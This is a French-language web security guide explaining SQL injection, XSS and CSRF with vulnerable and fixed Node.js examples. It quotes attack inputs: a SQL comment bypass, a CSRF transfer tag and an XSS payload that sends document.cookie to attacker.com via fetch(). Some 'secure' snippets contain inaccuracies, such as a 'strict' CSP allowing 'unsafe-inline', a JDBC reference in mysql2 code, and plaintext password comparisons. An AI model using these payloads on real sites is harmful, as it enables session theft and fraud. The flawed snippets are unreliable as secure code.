# Sécurité des Applications Web : Menaces et Prévention — Fiche Technique N°14

> **Thème** : Cybersécurité et protection des applications web | **Dernière mise à jour** : Mars 2026 | **Niveau** : Intermédiaire/Avancé

---

## 1. Introduction et contexte

La sécurité des applications web constitue un enjeu critique pour toute organisation opérant en ligne. Selon les données empiriques, **95 % des brèches de données résultent d'erreurs humaines**, ce qui souligne l'importance vitale de la formation et des processus robustes.

Les attaques informatiques augmentent en sophistication et en fréquence. En 2025, les organisations ont observé:

- **Volume d'attaques en croissance exponentielle** : Automatisation croissante des exploits
- **Coûts exponentiels des brèches** : Au-delà des amendes légales, perte de confiance client
- **Évolution des tactiques** : De moins en moins de brèches par force brute, davantage de manipulation humaine

### 1.1 Contexte légal et réglementaire

**RGPD (Règlement Général sur la Protection des Données)** : UE
- Amende maximale : 4% du chiffre d'affaires annuel (ou 20 millions €)
- Violation de données doit être notifiée dans les 72 heures

**nLPD (Nouvelle Loi sur la Protection des Données)** : Suisse
- Amende jusqu'à 250'000 CHF
- Entrée en vigueur : Septembre 2023

**LGPD** : Brésil (8% du chiffre d'affaires)
**CPRA** : Californie (USA)

---

## 2. Concepts fondamentaux

### 2.1 L'OWASP Top 10 2025

L'OWASP (Open Web Application Security Project) identifie les 10 catégories de vulnérabilités les plus critiques:

1. **Broken Access Control** : Authentification/autorisation défaillantes
2. **Cryptographic Failures** : Données sensibles exposées ou mal chiffrées
3. **Injection** : Injecte de code malveillant (SQL, OS, LDAP, etc.)
4. **Insecure Design** : Lacunes fondamentales dans l'architecture
5. **Security Misconfiguration** : Configurations par défaut dangereuses
6. **Vulnerable and Outdated Components** : Dépendances avec vulnérabilités connues
7. **Authentication Failures** : Mauvaise gestion des identités
8. **Software and Data Integrity Failures** : Mises à jour non sécurisées
9. **Logging & Monitoring Failures** : Capacités détection insuffisantes
10. **SSRF (Server-Side Request Forgery)** : Serveur fait requêtes involontaires

### 2.2 Les trois vecteurs d'attaque critiques

#### **1. SQL Injection**

Insertion de code SQL malveillant via champs de saisie utilisateur.

**Vulnérabilité typique :**

```javascript
// DANGEREUX : Concaténation directe
const username = req.body.username;
const password = req.body.password;
const query = "SELECT * FROM users WHERE username = '" + username +
              "' AND password = '" + password + "'";
db.execute(query);

// Attaque possible :
// username: admin' --
// Résultat de query: SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
// Le -- commente le reste, contourne la vérification mot de passe!
```

**Solution : Requêtes paramétrées (Prepared Statements)**

```javascript
// SÉCURISÉ : Paramètres liés
const mysql = require('mysql2/promise');
const connection = await mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: process.env.DB_PASSWORD,
  database: 'users_db'
});

// Utiliser placeholders (?) ou named parameters
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]
);

// Le driver JDBC gère automatiquement l'échappement
// L'utilisateur ne peut plus casser la structure SQL
```

**Exemple avancé avec ORM (protection native)**

```javascript
// Avec Sequelize ORM (protection intégrée)
const User = sequelize.define('User', {
  username: DataTypes.STRING,
  password: DataTypes.STRING
});

// Toutes les requêtes sont paramétrées automatiquement
const user = await User.findOne({
  where: {
    username: username,  // Automatiquement échappé
    password: password
  }
});

// Impossible d'injecter du SQL avec des ORMs modernes
```

#### **2. Cross-Site Scripting (XSS)**

Injection de JavaScript malveillant exécuté dans le navigateur utilisateur.

**Vulnérabilité typique :**

```html
<!-- DANGEREUX: Affichage direct du contenu utilisateur -->
<div id="comment">
  <%= userComment %>
</div>

<!-- Attaque possible :
userComment = "<img src=x onerror='fetch(`https://attacker.com?cookie=` + document.cookie)'>
Résultat: JavaScript exécuté, cookies volés -->
```

**Solution 1 : Échappement du contenu**

```javascript
// Node.js avec express-ejs
app.get('/comment/:id', (req, res) => {
  const comment = db.getComment(req.params.id);
  // EJS échappe automatiquement <%= %> avec htmlEscape
  res.render('comment', {
    comment: comment  // Caractères spéciaux convertis en entités HTML
  });
});

// <%= comment %> produit :
// <img src=x onerror=...> devient &lt;img src=x onerror=...&gt;
// Javascript n'est jamais exécuté
```

**Solution 2 : Content Security Policy (CSP)**

```javascript
// Dans Express
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    // Seuls les scripts de nos propres ressources autorisés
    "script-src 'self' https://cdn.example.com;" +
    // Seules images de nos serveurs et HTTPS externes
    "img-src 'self' https:;" +
    // Pas de inline styles (force fichiers CSS externes)
    "style-src 'self' https://fonts.googleapis.com;" +
    // Connexions uniquement vers notre domaine
    "connect-src 'self' https://api.example.com;" +
    // Embedded frames uniquement domaines approuvés
    "frame-src 'self' https://trusted-video-provider.com"
  );
  next();
});

// HTML Header alternative
// <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

**Solution 3 : DOMPurify pour contenu utilisateur riche**

```javascript
const DOMPurify = require('isomorphic-dompurify');

// Utilisateur veut poster du HTML formaté
const userHTML = '<p>Mon <strong>avis</strong> sur le produit</p>' +
                 '<img src=x onerror="alert(1)">';

// DOMPurify supprime les scripts tout en préservant format
const cleanHTML = DOMPurify.sanitize(userHTML);
// Résultat: '<p>Mon <strong>avis</strong> sur le produit</p><img src="x">'
// Le onerror est supprimé, le contenu formaté preserved
```

#### **3. Cross-Site Request Forgery (CSRF)**

Forcer utilisateur authentifié à effectuer actions non désirées sans son consentement.

**Vulnérabilité typique :**

```html
<!-- Site attaquant -->
<img src="https://example.com/transfer?to=attacker&amount=1000">

<!-- Si utilisateur connecté à example.com:
    1. Requête envoyée avec cookies de session automatiquement
    2. Serveur accepte (provenance: navigateur = réputé sûr)
    3. Transfert effectué sans consentement -->
```

**Solution 1 : Tokens CSRF anti-forgery**

```javascript
// Configuration Express avec csrf-csrf
const { csrfProtection, generateToken } = require('express-csrf-protection');

app.use(express.json());
app.use(csrfProtection);

// GET: Afficher formulaire, inclure token
app.get('/form', (req, res) => {
  const token = generateToken(req, res);
  res.render('form', { csrfToken: token });
});

// HTML du formulaire
// <form method="POST" action="/submit">
//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
//   <input type="text" name="data">
// </form>

// POST: Vérifier token avant traitement
app.post('/submit', csrfProtection, (req, res) => {
  // csrfProtection middleware valide le token
  // Si manquant ou invalide → erreur 403

  const data = req.body.data;
  db.save(data);
  res.json({ success: true });
});
```

**Solution 2 : SameSite Cookies (moderne)**

```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  store: sessionStore,
  cookie: {
    // SameSite empêche envoi cookies sur requêtes cross-site
    sameSite: 'strict',  // 'strict' = jamais envoyé cross-site
                         // 'lax' = envoyé sur navigation top-level seulement
                         // 'none' = envoyé partout (nécessite Secure flag)
    secure: true,        // HTTPS uniquement
    httpOnly: true,      // Pas accessible JavaScript
    maxAge: 3600000      // 1 heure
  }
}));
```

### 2.3 Content Security Policy (CSP) approfondie

CSP est un mécanisme de défense en profondeur contre XSS et injection.

```javascript
// Configuration stricte recommandée
const cspHeader = `
  default-src 'none';
  script-src 'self' 'unsafe-inline' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  block-all-mixed-content;
`;

// Report CSP violations pour monitoring
app.post('/csp-report', (req, res) => {
  const violation = req.body['csp-report'];
  console.warn('CSP Violation:', {
    'blocked-uri': violation['blocked-uri'],
    'violated-directive': violation['violated-directive'],
    'original-policy': violation['original-policy']
  });

  // Envoyer alert monitoring
  alertSecurityTeam(violation);
  res.sendStatus(204);
});

// CSP avec report-uri
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    cspHeader + `report-uri /csp-report`
  );
  next();
});
```

---

## 3. Exemples pratiques

### 3.1 Validation et sanitisation des inputs

```javascript
// Utiliser express-validator pour validation robuste
const { body, validationResult, sanitizeBody } = require('express-validator');

app.post('/register',
  // Valider format email
  body('email').isEmail().normalizeEmail(),
  // Valider longueur et contenu password
  body('password').isLength({ min: 12 })
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/),
    // Minimum: 1 minuscule, 1 majuscule, 1 chiffre, 1 caractère spécial
  // Valider username alphanumériques + tirets
  body('username').matches(/^[a-zA-Z0-9_-]{3,20}$/),
  // Trim et escape HTML pour nom complet
  body('fullName').trim().escape(),

  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    const { email, password, username, fullName } = req.body;

    // Inputs validés, can proceed en confiance
    db.createUser({ email, password, username, fullName });
    res.json({ message: 'Utilisateur créé' });
  }
);

// Exemple d'attaque XSS bloquée:
// POST /register
// email: attacker@test.com
// password: P@ssw0rd123
// fullName: <img src=x onerror="alert(1)">
// → Sera échappé: &lt;img src=x onerror=&quot;alert(1)&quot;&gt;
```

### 3.2 Gestion sécurisée des sessions

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

// Utiliser Redis pour sessions (pas fichiers ou mémoire)
const redisClient = createClient({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
  password: process.env.REDIS_PASSWORD,
  // Chiffrement TLS recommandé
  tls: process.env.NODE_ENV === 'production' ? {} : undefined
});

const sessionStore = new RedisStore({ client: redisClient });

app.use(session({
  store: sessionStore,
  secret: process.env.SESSION_SECRET,  // Changé secrètement régulièrement
  name: 'sessionId',  // Pas "connect.sid" par défaut (révèle technologie)
  cookie: {
    // Sécurité maximale
    secure: true,        // HTTPS obligatoire
    httpOnly: true,      // Pas accessible via JavaScript (anti-XSS)
    sameSite: 'strict',  // Pas envoyé cross-site (anti-CSRF)
    maxAge: 900000,      // 15 minutes
    domain: 'example.com' // Explicite, pas de wildcard
  },
  // Régénérer ID après login (anti-session fixation)
  resave: false,
  saveUninitialized: false,
  proxy: true  // Si derrière reverse proxy (trust headers)
}));

// Authentification
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const user = await db.findUser(username);
  if (!user) {
    // NE PAS révéler si utilisateur existe (timing attack)
    return res.status(401).json({ error: 'Identifiants invalides' });
  }

  // Bcrypt ou Argon2 obligatoires (NOT MD5, NOT SHA1)
  const isValid = await bcrypt.compare(password, user.passwordHash);
  if (!isValid) {
    return res.status(401).json({ error: 'Identifiants invalides' });
  }

  // Succès: régénérer session ID
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Erreur serveur' });

    req.session.userId = user.id;
    req.session.username = user.username;

    // Secure re-login: destroy old session
    res.json({
      success: true,
      message: 'Connexion établie'
    });
  });
});

// Middleware protection routes authentifiées
const requireAuth = (req, res, next) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Authentification requise' });
  }
  next();
};

app.get('/protected', requireAuth, (req, res) => {
  res.json({ message: `Bonjour ${req.session.username}` });
});
```

### 3.3 Chiffrement et hachage de mots de passe

```javascript
const bcrypt = require('bcrypt');
const argon2 = require('argon2');

// 1. BCRYPT: Robuste et standard
async function registerWithBcrypt(password) {
  // cost: 12-14 recommandé (2^n itérations)
  // 12 = ~250ms, 14 = ~1s par hash
  const salt = await bcrypt.genSalt(12);
  const hash = await bcrypt.hash(password, salt);

  // Hash contient salt + hash résultant
  // Format: $2b$12$...
  return hash;
}

async function loginWithBcrypt(password, hash) {
  const isValid = await bcrypt.compare(password, hash);
  return isValid;
}

// 2. ARGON2: Plus moderne et sécurisé (recommandé 2025+)
async function registerWithArgon2(password) {
  const hash = await argon2.hash(password, {
    type: argon2.argon2id,  // Plus résistant aux attaques GPU
    memoryCost: 65536,       // 64 MB mémoire
    timeCost: 3,             // 3 itérations
    parallelism: 4           // 4 threads
  });

  return hash;
}

async function loginWithArgon2(password, hash) {
  try {
    const isValid = await argon2.verify(hash, password);
    return isValid;
  } catch (err) {
    // Hash invalide format
    return false;
  }
}

// Exemple complet inscription
app.post('/signup', async (req, res) => {
  const { email, password } = req.body;

  // Validation robuste password
  const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[a-zA-Z\d@$!%*?&]{12,}$/;
  if (!passwordRegex.test(password)) {
    return res.status(400).json({
      error: 'Password: minimum 12 caractères, majuscule, minuscule, chiffre, spécial'
    });
  }

  // Hachage sécurisé
  const hash = await argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,
    timeCost: 3
  });

  // Stocker hash (jamais le password)
  const user = await db.createUser({
    email: email,
    passwordHash: hash  // Sauvegarder le hash SEULEMENT
  });

  res.status(201).json({ message: 'Utilisateur créé' });
});
```

### 3.4 HTTPS et certificats SSL/TLS

```javascript
const https = require('https');
const fs = require('fs');
const express = require('express');

const app = express();

// Configuration HTTPS avec certificat
const options = {
  key: fs.readFileSync(process.env.KEY_PATH),   // Clé privée
  cert: fs.readFileSync(process.env.CERT_PATH)  // Certificat public
};

const server = https.createServer(options, app);

// Headers HSTS (HTTP Strict Transport Security)
app.use((req, res, next) => {
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
    // max-age: 1 an en secondes
    // includeSubDomains: tous les subdomains HTTPS
    // preload: inclure dans liste preload navigateurs
  );
  next();
});

// Redirection HTTP → HTTPS
const redirectApp = express();
redirectApp.use((req, res) => {
  res.redirect(301, `https://${req.hostname}${req.url}`);
});
http.createServer(redirectApp).listen(80);

// Démarrer HTTPS serveur
server.listen(443, () => {
  console.log('HTTPS serveur écoute port 443');
});

// Certificat Let's Encrypt (gratuit) avec Certbot
// sudo certbot certonly --standalone -d example.com
// Auto-renouvellement tous les 90 jours
```

---

## 4. Bonnes pratiques

### 4.1 Principes de sécurité défense en profondeur

1. **Defense in Depth** : Multiples couches de protection
   - Validation client (UX)
   - Validation serveur (sécurité)
   - CSP (navigateur)
   - WAF (réseau)
   - Monitoring (détection)

2. **Principle of Least Privilege** : Accès minimal nécessaire
   ```javascript
   // Mauvais: User peut éditer n'importe quel article
   // Bon: User peut éditer seulement ses articles
   const article = await Article.findById(req.params.id);
   if (article.authorId !== req.session.userId) {
     return res.status(403).json({ error: 'Non autorisé' });
   }
   ```

3. **Fail Securely** : En cas d'erreur, nier l'accès par défaut
   ```javascript
   // Mauvais: try-catch qui accepte si erreur
   // Bon: try-catch qui refuse si erreur
   try {
     authenticate();
   } catch (e) {
     return res.status(401).json({ error: 'Erreur auth' });
   }
   ```

### 4.2 Outils de scanning et monitoring

**OWASP ZAP** : Scanner automatique de vulnérabilités
```bash
# Scan passif et actif sur application
docker run --rm -v $(pwd):/zap:rw \
  owasp/zap2docker-stable zap-baseline.py \
  -t https://target.example.com

# Génère rapport HTML avec vulnérabilités trouvées
```

**CloudFlare WAF** : Web Application Firewall
- Bloque attaques connues (SQL injection, XSS)
- Rate limiting anti-brute force
- Protection DDoS
- Monitoring temps réel

### 4.3 Logging et forensique

```javascript
// Événements à logger (sans données sensibles)
const securityLogger = require('winston').createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({
      filename: '/var/log/security.log'
    })
  ]
});

// Tentatives authentification échouées
app.post('/login', async (req, res) => {
  try {
    const isValid = await authenticateUser(req.body);
    if (!isValid) {
      securityLogger.warn({
        event: 'FAILED_LOGIN_ATTEMPT',
        timestamp: new Date().toISOString(),
        ip: req.ip,
        email: req.body.email  // Acceptable (pas password!)
      });
    }
  } catch (err) {
    securityLogger.error({
      event: 'LOGIN_ERROR',
      error: err.message,
      ip: req.ip
    });
  }
});

// Accès à ressources sensibles
app.get('/admin/users', requireAuth, requireAdmin, (req, res) => {
  securityLogger.info({
    event: 'ADMIN_ACCESS',
    adminId: req.session.userId,
    endpoint: '/admin/users',
    timestamp: new Date().toISOString()
  });

  res.json(getAllUsers());
});
```

---

## 5. Comparaison / Alternatives

### 5.1 Stratégies d'authentification

| Stratégie | Avantages | Inconvénients | Cas d'usage |
|-----------|-----------|---------------|-----------|
| **Session-based** | Simple, serveur contrôle | Stockage serveur, scaling | Applications monolithiques |
| **JWT Tokens** | Stateless, scalable | Révocation difficile | APIs, microservices |
| **OAuth 2.0** | SSO, délégation | Complexité, dépendance provider | Social login, intégration |
| **SAML** | Enterprise, fédéré | Lourd, XML | Organisations grandes |
| **WebAuthn** | Très sécurisé, phishing-proof | Support navigateur limité | Nouvelles applications |

### 5.2 Services de sécurité gérée vs. In-house

| Aspect | In-house | Service Managé |
|--------|----------|-----------------|
| **Coût initial** | Moyen | Haut |
| **Maintenance** | Élevée | Faible |
| **Expertise requise** | Très élevée | Faible |
| **Contrôle** | Total | Limité |
| **Scalabilité** | Lente | Rapide |

---

## 6. Ressources externes (analyse critique)

### 6.1 Ressources officielles

**OWASP Top 10** (https://owasp.org/www-project-top-ten/)
- **Qualité** : Excellente, référence mondiale
- **Fiabilité** : Basée sur données communauté et incidents réels
- **Limite** : N'inclut pas TOUS les risques (principaux seulement)
- **Conseil** : Consulter annuellement, mise à jour 2021 disponible

**OWASP Cheat Sheets** (https://cheatsheetseries.owasp.org/)
- **Qualité** : Très bonne, pratique immédiate
- **Fiabilité** : Révisée régulièrement par communauté
- **Utilité** : Excellent pour apprentissage progressif des patterns sécurisés

### 6.2 Outils et plateformes

**Snyk** (https://snyk.io/)
- **Qualité** : Excellente pour dépendances vulnérables
- **Limite** : Freemium, features avancées payantes
- **Recommandation** : Intégrer dans pipeline CI/CD

**HackerOne** (https://www.hackerone.com/)
- **Qualité** : Bug bounty légitime, chevauche pentesters réels
- **Limite** : Coûteux, peut révéler vulnérabilités publiquement
- **Recommandation** : Pour organisations pouvant se permettre

---

## 7. Points clés à retenir

1. **95% des brèches viennent d'erreurs humaines** : Formation essentielle
2. **Validation TOUJOURS côté serveur** : Client peut être contourné
3. **Jamais stocker passwords en clair** : Bcrypt, Argon2, jamais MD5/SHA1
4. **HTTPS obligatoire** : Pas d'exception, TLS 1.2+ minimum
5. **CSP comme filet de sécurité** : Contre XSS même si validation échoue
6. **SameSite cookies modernes** : Protection CSRF intégrée
7. **Monitoring continu** : Logs et alertes sur événements anormaux
8. **Dépendances à jour** : Scanning régulier avec Snyk/Dependabot
9. **Secrets en variables d'environnement** : Jamais en code source
10. **Defense in Depth** : Aucune seule mesure suffit, layering essentiel

---

**Date de publication** : Mars 2026
**Prochaine révision** : Septembre 2026
**Mots-clés** : Sécurité web, OWASP, injection SQL, XSS, CSRF, authentification, chiffrement
